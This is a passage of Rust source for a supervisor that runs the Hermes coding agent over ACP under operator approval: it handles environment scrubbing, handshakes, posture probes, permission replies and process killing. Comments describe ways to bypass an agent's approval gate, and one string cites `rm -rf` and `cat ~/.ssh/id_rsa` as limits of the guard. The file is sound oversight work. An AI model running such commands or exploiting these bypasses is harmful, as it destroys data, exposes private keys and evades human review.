/// The order below is also load-bearing. `extra_env` is applied LAST, so a
/// caller who deliberately sets `HERMES_YOLO_MODE` there beats the scrub —
/// and then the probe, seeing the same variable, answers `allow` and the
/// session is refused. The hole closes itself precisely because both sides
/// see the same environment.
#[derive(Clone, Debug, Default)]
pub struct ChildEnv {
    remove: Vec<String>,
    set: Vec<(String, String)>,
}

impl ChildEnv {
    /// Build the overlay for one session.
    ///
    /// `HERMES_INTERACTIVE=1` is defence in depth, not decoration. Hermes'
    /// dangerous-command gate is documented as keeping "its historical
    /// fail-open default" when it believes no human is reachable
    /// (`tools/approval.py`, `fail_closed_when_no_human`) — i.e. it
    /// auto-approves. The ACP adapter normally marks the run interactive
    /// through a contextvar; this makes the environment agree, so the
    /// fail-open branch is unreachable even if that contextvar is ever
    /// missed. It causes no terminal read: the approval callback is
    /// resolved from a registered per-thread callback and is `None` when
    /// absent, never `input()`.
    pub fn for_session(extra_env: &[(String, String)]) -> Self {
        // eave's own variables never reach a child (spec 01 §Spawn).
        let mut remove: Vec<String> = std::env::vars()
            .map(|(k, _)| k)
            .filter(|k| k.starts_with("EAVE_"))
            .collect();
        remove.extend(SCRUBBED_HERMES_VARS.iter().map(|s| s.to_string()));
        let mut set = vec![("HERMES_INTERACTIVE".to_string(), "1".to_string())];
        set.extend(extra_env.iter().cloned());
        Self { remove, set }
    }

    fn apply(&self, cmd: &mut Command) {
        for var in &self.remove {
            cmd.env_remove(var);
        }
        for (k, v) in &self.set {
            cmd.env(k, v);
        }
    }
}

// ---------------------------------------------------------------------------
// Reader task

struct Reader {
    shared: Arc<Shared>,
    tx: mpsc::Sender<SessionEvent>,
    stdin: SharedStdin,
    /// The session's working directory, which `session/new` and
    /// `session/load` both name.
    cwd: std::path::PathBuf,
    /// The posture probe, started at spawn and awaited once the wire has
    /// answered. `Option` because it is taken exactly once; `Mutex`
    /// because the reader task holds `&self`.
    preflight: tokio::sync::Mutex<Option<tokio::task::JoinHandle<Preflight>>>,
    /// `Some(id)` when this is a resume: `session/load` that id instead of
    /// minting a new one with `session/new`.
    resume: Option<String>,
}

impl Reader {
    async fn run(self, stdout: tokio::process::ChildStdout) {
        // Open the conversation. Everything after this is driven by what
        // comes back, in `handle`.
        self.send(json!({
            "jsonrpc": "2.0",
            "id": ID_INITIALIZE,
            "method": "initialize",
            "params": {
                "protocolVersion": ACP_PROTOCOL_VERSION,
                // eave serves no filesystem or terminal on the agent's
                // behalf: Hermes must use its own tools, which are the
                // ones its approval gate covers. Claiming capabilities
                // eave does not implement would route work around the
                // very gate this adapter exists to keep armed.
                "clientCapabilities": {
                    "fs": { "readTextFile": false, "writeTextFile": false },
                    "terminal": false,
                },
            },
        }))
        .await;

        let mut lines = BufReader::new(stdout).lines();
        while let Ok(Some(line)) = lines.next_line().await {
            *self.shared.last_activity.lock().unwrap() = Instant::now();
            if self.shared.kill_initiated.load(Ordering::SeqCst) {
                continue;
            }
            self.handle(&line).await;
        }
        // The stream ended. If the handshake never completed, every future
        // caller of `acp_session_id` would otherwise wait forever: the
        // `watch` sender lives in `Shared`, which the session handle keeps
        // alive, so a dead child never closes the channel on its own. A
        // send that blocks for the lifetime of the process is worse than a
        // send that fails, and much worse than one that says why.
        if *self.shared.ready.borrow() == Handshake::Pending {
            self.mark_refused(
                "the Hermes process ended before it could open an ACP session, so eave has \
                 nothing to send a prompt to"
                    .into(),
            )
            .await;
        }
    }

    async fn handle(&self, line: &str) {
        let line = line.trim();
        if line.is_empty() {
            return;
        }
        let v: Value = match serde_json::from_str(line) {
            Ok(v) => v,
            Err(err) => return self.emit_all(vec![malformed(line, err.to_string())]).await,
        };

        let method = v.get("method").and_then(Value::as_str);
        let id = v.get("id");

        match (method, id) {
            // A request from the agent to us.
            (Some(m), Some(id)) => self.agent_request(m, id, &v, line).await,
            // A notification from the agent.
            (Some("session/update"), None) => {
                let events = self
                    .shared
                    .stream
                    .lock()
                    .unwrap()
                    .parse_session_update(&v["params"], line);
                self.emit_all(events).await;
            }
            (Some(other), None) => {
                self.emit(SessionEvent::Unknown {
                    event_type: other.to_string(),
                    raw: line.to_string(),
                })
                .await;
            }
            // A reply to something we asked.
            (None, Some(id)) => self.reply(id.as_u64(), &v, line).await,
            (None, None) => {
                self.emit_all(vec![malformed(
                    line,
                    "neither a request nor a reply".into(),
                )])
                .await
            }
        }
    }

    async fn agent_request(&self, method: &str, id: &Value, v: &Value, line: &str) {
        if method == "session/request_permission" {
            // The JSON-RPC id IS the request id: the answer is a reply
            // naming it. Stringified because `SessionEvent` is
            // provider-neutral and Claude's ids are strings; the reply
            // path parses it back so a numeric id goes out numeric.
            let key = json_id_key(id);
            let events = self
                .shared
                .stream
                .lock()
                .unwrap()
                .parse_permission_request(&key, &v["params"]);
            return self.emit_all(events).await;
        }
        // Anything else the agent asks of a client — `fs/read_text_file`,
        // `terminal/create` — eave declined at `initialize` and cannot
        // serve. Answer immediately with a stated refusal (Slice K
        // amendment 2's principle): silence would park the turn on a
        // request nobody can see.
        self.send(json!({
            "jsonrpc": "2.0",
            "id": id,
            "error": {
                "code": -32601,
                "message": format!(
                    "eave does not implement the ACP client method {method:?}; \
                     use your own tools, which is what the operator reviews."
                ),
            },
        }))
        .await;
        self.emit(SessionEvent::DialogRefused {
            request_id: json_id_key(id),
            dialog: method.to_string(),
        })
        .await;
        let _ = line;
    }

    async fn reply(&self, id: Option<u64>, v: &Value, line: &str) {
        match id {
            Some(ID_INITIALIZE) => {
                if let Some(err) = v.get("error") {
                    return self
                        .refuse(format!(
                            "Hermes refused the ACP handshake ({err}), so eave cannot \
                             establish a session it is able to review"
                        ))
                        .await;
                }
                let params = match &self.resume {
                    Some(session_id) => json!({
                        "sessionId": session_id,
                        "cwd": self.cwd,
                        "mcpServers": [],
                    }),
                    // ACP has no caller-chosen id: `session/new` takes a
                    // cwd and answers with an id Hermes minted. eave's own
                    // `cfg.session_id` therefore cannot be imposed on a
                    // NEW Hermes session (unlike Claude's `--session-id`)
                    // and the provider cursor is discovered instead —
                    // which is exactly why `provider_session_id()` is an
                    // Option. On resume it goes the other way: the id eave
                    // holds is the one `session/load` is asked for.
                    None => json!({ "cwd": self.cwd, "mcpServers": [] }),
                };
                let method = if self.resume.is_some() {
                    "session/load"
                } else {
                    "session/new"
                };
                self.send(json!({
                    "jsonrpc": "2.0",
                    "id": ID_SESSION_SETUP,
                    "method": method,
                    "params": params,
                }))
                .await;
            }
            Some(ID_SESSION_SETUP) => self.session_opened(v, line).await,
            // A turn finished.
            Some(_) => {
                let text = {
                    let mut stream = self.shared.stream.lock().unwrap();
                    std::mem::take(&mut stream.turn_text)
                };
                if !text.is_empty() {
                    self.emit(SessionEvent::AssistantText { text }).await;
                }
                // Any tool still outstanding when the turn ends will never
                // be resolved: Hermes reports completions from the step
                // that follows a tool, and a turn that ends (or is
                // cancelled, or errors) has no such step. Closing them
                // here states a fact — the turn ended with no result —
                // rather than leaving a permanent phantom in flight.
                let orphans = {
                    let mut stream = self.shared.stream.lock().unwrap();
                    std::mem::take(&mut stream.outstanding)
                };
                for id in orphans {
                    self.emit(SessionEvent::ToolUseFinished {
                        id,
                        result: "the turn ended before Hermes reported a result for this tool"
                            .into(),
                        is_error: true,
                    })
                    .await;
                }
                // A turn that failed at the protocol level. The error
                // object is kept verbatim alongside the verdict, because
                // "the turn errored" without saying how is the kind of
                // record that sends someone back to the CLI's own logs.
                if v.get("error").is_some() {
                    self.emit(SessionEvent::System {
                        subtype: "prompt_error".into(),
                        raw: line.to_string(),
                    })
                    .await;
                    self.emit(SessionEvent::TurnCompleted {
                        subtype: "error".into(),
                        is_error: true,
                    })
                    .await;
                    return;
                }
                let stop = v
                    .get("result")
                    .and_then(|r| r.get("stopReason"))
                    .and_then(Value::as_str)
                    .unwrap_or("unknown");
                self.emit(SessionEvent::TurnCompleted {
                    subtype: stop.to_string(),
                    // Hermes' own word for the outcome, not an inference:
                    // `refusal` is the only stop reason that reports the
                    // turn itself as failed (`acp/schema.py` StopReason).
                    is_error: stop == "refusal",
                })
                .await;
            }
            None => {
                self.emit_all(vec![malformed(line, "reply with a non-integer id".into())])
                    .await
            }
        }
    }

    /// `session/new` or `session/load` answered: verify the posture from
    /// two independent facts before letting the session do anything.
    async fn session_opened(&self, v: &Value, line: &str) {
        if let Some(err) = v.get("error") {
            return self
                .refuse(format!(
                    "Hermes could not open an ACP session ({err}), so there is nothing for \
                     eave to supervise"
                ))
                .await;
        }
        let result = &v["result"];
        // On `session/load` the id is the one we asked for; ACP does not
        // echo it in the reply, so fall back to it rather than inventing.
        let session_id = result
            .get("sessionId")
            .and_then(Value::as_str)
            .map(str::to_string)
            .or_else(|| self.resume.clone());
        let Some(session_id) = session_id else {
            return self
                .emit_all(vec![malformed(
                    line,
                    "session opened without a sessionId".into(),
                )])
                .await;
        };
        let mode = result
            .get("modes")
            .and_then(|m| m.get("currentModeId"))
            .and_then(Value::as_str)
            .map(str::to_string);

        self.shared.stream.lock().unwrap().session_id = Some(session_id.clone());

        // Proof one: Hermes' own statement of the edit posture, the direct
        // analogue of Claude's `init.permissionMode`.
        if let Some(refusal) = mode_refusal(mode.as_deref()) {
            self.emit(SessionEvent::Init {
                session_id,
                permission_mode: mode,
                // Empty is the honest answer, not a placeholder: this
                // provider has announced no command inventory to eave.
                // ACP's `availableCommands` is not read yet — see Not done.
                slash_commands: Vec::new(),
            })
            .await;
            let reason = match &refusal {
                SessionEvent::PostureRefused { reason, .. } => reason.clone(),
                _ => unreachable!("mode_refusal only ever returns PostureRefused"),
            };
            self.emit(refusal).await;
            return self.mark_refused(reason).await;
        }

        // Proof two: the command gate, which the wire cannot show us.
        // Started at spawn; this is where its answer is collected.
        let probe = match self.preflight.lock().await.take() {
            Some(task) => task.await.unwrap_or_else(|err| {
                Preflight::Refused(format!(
                    "eave could not complete the Hermes approval probe ({err}); a posture \
                     that cannot be checked is not a posture eave will run under"
                ))
            }),
            // Only reachable if Hermes answered `session/new` twice, which
            // would itself be a protocol violation — refuse rather than
            // treat a second unverified session as already proven.
            None => Preflight::Refused(
                "Hermes opened a second ACP session on one connection; eave cannot vouch \
                 for a posture it has not checked"
                    .into(),
            ),
        };
        if let Preflight::Refused(reason) = probe {
            self.emit(SessionEvent::Init {
                session_id,
                permission_mode: mode.clone(),
                // Empty is the honest answer, not a placeholder: this
                // provider has announced no command inventory to eave.
                // ACP's `availableCommands` is not read yet — see Not done.
                slash_commands: Vec::new(),
            })
            .await;
            self.emit(SessionEvent::PostureRefused {
                mode: mode.unwrap_or_else(|| "unstated".into()),
                reason: reason.clone(),
            })
            .await;
            return self.mark_refused(reason).await;
        }

        self.emit(SessionEvent::Init {
            session_id: session_id.clone(),
            permission_mode: mode,
            // Empty is the honest answer, not a placeholder: this
            // provider has announced no command inventory to eave.
            // ACP's `availableCommands` is not read yet — see Not done.
            slash_commands: Vec::new(),
        })
        .await;
        let _ = self.shared.ready.send(Handshake::Verified(session_id));
    }

    /// Refuse before any posture could be stated at all.
    async fn refuse(&self, reason: String) {
        self.emit(SessionEvent::PostureRefused {
            mode: "unstated".into(),
            reason: reason.clone(),
        })
        .await;
        self.mark_refused(reason).await;
    }

    async fn mark_refused(&self, reason: String) {
        let _ = self.shared.ready.send(Handshake::Refused(reason));
    }

    async fn send(&self, frame: Value) {
        // Best effort from the reader task, which has no one to report to:
        // a closed pipe means the child is already going away.
        let _ = write_frame(&self.stdin, &frame.to_string()).await;
    }

    /// Returns whether anyone was listening, which nothing acts on —
    /// a gone receiver just means nobody is watching, and the reader keeps
    /// draining so the child never blocks on a full pipe.
    async fn emit(&self, event: SessionEvent) -> bool {
        self.tx.send(event).await.is_ok()
    }

    async fn emit_all(&self, events: Vec<SessionEvent>) {
        for event in events {
            self.emit(event).await;
        }
    }
}

/// The string form of a JSON-RPC id, used as eave's `request_id`.
fn json_id_key(id: &Value) -> String {
    match id {
        Value::String(s) => s.clone(),
        other => other.to_string(),
    }
}

/// Turn a `request_id` back into the JSON-RPC id it came from, so a reply
/// names the same id in the same type. `3` must go back as the number `3`,
/// not the string `"3"` — a JSON-RPC peer is entitled to reject the latter.
fn json_id_from_key(key: &str) -> Value {
    match serde_json::from_str::<Value>(key) {
        Ok(v @ (Value::Number(_) | Value::String(_))) => v,
        _ => Value::String(key.to_string()),
    }
}

// ---------------------------------------------------------------------------

#[async_trait]
impl crate::provider::AgentAdapter for HermesSession {
    const PROVIDER_ID: &'static str = "hermes";

    const POSTURE: crate::provider::PostureProof = crate::provider::PostureProof::Verified {
        evidence: "hermes.rs: posture is proven TWICE per spawn — `modes.currentModeId` read off \
                   the ACP wire, plus two dangerous canaries through `hermes approvals test` (a \
                   dry-run evaluator that never executes), which is the only check that can see a \
                   bypass living in config or env. Slice AW proved `--ignore-user-config` does NOT \
                   close the approval bypass — the gate reads a different config loader — so the \
                   canary is load-bearing. LIMITS, stated because Verified is binary and this is \
                   not parity with Claude: the guard is pattern-based, so it asks on `rm -rf` and \
                   ALLOWS `cat ~/.ssh/id_rsa`; Hermes stops waiting after 60s and denies on its \
                   own; and ACP carries no free text on the response, so the operator's deny \
                   message never reaches the model.",
    };

    fn spawn(cfg: &SpawnConfig) -> Result<(Self, mpsc::Receiver<SessionEvent>), SessionError> {
        HermesSession::spawn(cfg)
    }
}

#[async_trait]
impl AgentSession for HermesSession {
    fn identity(&self) -> ProcIdentity {
        self.identity
    }

    fn provider_session_id(&self) -> Option<String> {
        self.shared.stream.lock().unwrap().session_id.clone()
    }

    fn in_flight_tools(&self) -> usize {
        self.shared.stream.lock().unwrap().in_flight()
    }

    fn last_activity(&self) -> Instant {
        *self.shared.last_activity.lock().unwrap()
    }

    fn watch(&self) -> SessionWatch {
        SessionWatch::new(
            self.identity,
            Arc::clone(&self.stdout_eof),
            Arc::clone(&self.exited_flag),
        )
    }

    async fn send_user_message(
        &mut self,
        text: &str,
        images: &[ImageRef],
    ) -> Result<(), SessionError> {
        let session_id = self.acp_session_id().await?;
        let id = self.next_id.fetch_add(1, Ordering::SeqCst);
        write_frame(
            &self.stdin,
            &prompt_frame(id, &session_id, text, &media::encode_all(images)?),
        )
        .await
    }

    fn pending_approvals(&self) -> usize {
        self.shared.stream.lock().unwrap().pending_approvals()
    }

    /// Answer one permission question by replying to the JSON-RPC request
    /// Hermes is blocked on.
    ///
    /// `Ok(false)` means the question was not open — already answered, or
    /// aged out under [`APPROVAL_STALE_AFTER`]. That is a race, not an
    /// error, and it must never reach the pipe: a stale decision would be
    /// ignored by Hermes and journaled by eave as if it had landed.
    ///
    /// **The deny message does not travel.** ACP's
    /// `RequestPermissionResponse` carries an outcome and an option id and
    /// nothing else, so "denied — commit first" reaches Hermes as the same
    /// bytes as "denied". Under Claude the message is handed to the model
    /// verbatim; here it is journaled by eave and stops there. Stated
    /// rather than papered over: the alternative was smuggling it into
    /// `_meta`, which Hermes does not read, and which would look like
    /// delivery without being it.
    async fn respond_to_approval(
        &mut self,
        request_id: &str,
        decision: &ApprovalDecision,
    ) -> Result<bool, SessionError> {
        let wanted = match decision {
            ApprovalDecision::Allow => OPTION_ALLOW,
            ApprovalDecision::Deny { .. } => OPTION_DENY,
        };
        {
            let stream = self.shared.stream.lock().unwrap();
            let Some(pending) = stream.pending.get(request_id) else {
                return Ok(false);
            };
            if !pending.options.contains(wanted) {
                // Hermes offered a set this adapter cannot answer from.
                // Guessing an id would be answering a question eave did
                // not understand, on the operator's behalf.
                return Err(SessionError::Io(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    format!(
                        "Hermes did not offer the {wanted:?} option for this permission \
                         request, so eave cannot deliver that decision without guessing"
                    ),
                )));
            }
        }
        let frame = json!({
            "jsonrpc": "2.0",
            "id": json_id_from_key(request_id),
            "result": {
                "outcome": { "outcome": "selected", "optionId": wanted },
            },
        });
        write_frame(&self.stdin, &frame.to_string()).await?;
        // Only now is the question closed: a failed write leaves it open
        // so the operator can try again rather than facing a dead card.
        self.shared
            .stream
            .lock()
            .unwrap()
            .resolve_approval(request_id);
        Ok(true)
    }

    async fn kill(&mut self) -> Result<KillReport, SessionError> {
        self.shared.kill_initiated.store(true, Ordering::SeqCst);
        let already_exited = self.exited();
        let mut escalated = false;

        if !already_exited {
            // Group signals are safe without a pid-reuse guard: while any
            // member lives the pgid stays reserved by the kernel, and once
            // the group is empty killpg is ESRCH — a no-op.
            let _ = process::killpg(self.pgid, libc::SIGTERM);
            if !self.await_exit(KILL_GRACE).await {
                escalated = true;
                let _ = process::killpg(self.pgid, libc::SIGKILL);
                if !self.await_exit(KILL_VERIFY_WINDOW).await {
                    return Err(SessionError::KillUnproven {
                        remaining: vec![self.identity.pid],
                    });
                }
            }
        }

        if process::await_group_empty(self.pgid, KILL_VERIFY_WINDOW).await {
            return Ok(KillReport {
                escalated,
                already_exited,
                stragglers_killed: Vec::new(),
            });
        }

        // One bounded straggler scan (spec 01 §Kill step 3). Pids are
        // fresh from the scan, which is the guard for signalling directly.
        let _ = process::killpg(self.pgid, libc::SIGKILL);
        let stragglers = process::scan_group_pids(self.pgid)
            .await
            .unwrap_or_default();
        for &pid in &stragglers {
            unsafe {
                libc::kill(pid, libc::SIGKILL);
            }
        }
        if process::await_group_empty(self.pgid, KILL_VERIFY_WINDOW).await {
            Ok(KillReport {
                escalated,
                already_exited,
                stragglers_killed: stragglers,
            })
        } else {
            Err(SessionError::KillUnproven {
                remaining: stragglers,
            })
        }
    }
}

/// ACP `session/prompt`, same image block Grok uses (T3 `GrokAdapter`
/// and `CursorAdapter` share `{type:image, data, mimeType}`).
fn prompt_frame(id: u64, session_id: &str, text: &str, images: &[EncodedImage]) -> String {
    let mut prompt = Vec::new();
    if !text.is_empty() {
        prompt.push(json!({ "type": "text", "text": text }));
    }
    for img in images {
        prompt.push(media::acp_image_block(img));
    }
    json!({
        "jsonrpc": "2.0",
        "id": id,
        "method": "session/prompt",
        "params": {
            "sessionId": session_id,
            "prompt": prompt,
        },
    })
    .to_string()
}

/// Write one JSON-RPC frame to the child's stdin under the shared lock.
async fn write_frame(stdin: &SharedStdin, line: &str) -> Result<(), SessionError> {
    let mut guard = stdin.lock().await;
    let pipe = guard.as_mut().ok_or(SessionError::StdinClosed)?;
    let mut payload = String::with_capacity(line.len() + 1);
    payload.push_str(line);
    payload.push('\n');
    pipe.write_all(payload.as_bytes()).await?;
    pipe.flush().await?;
    Ok(())
}
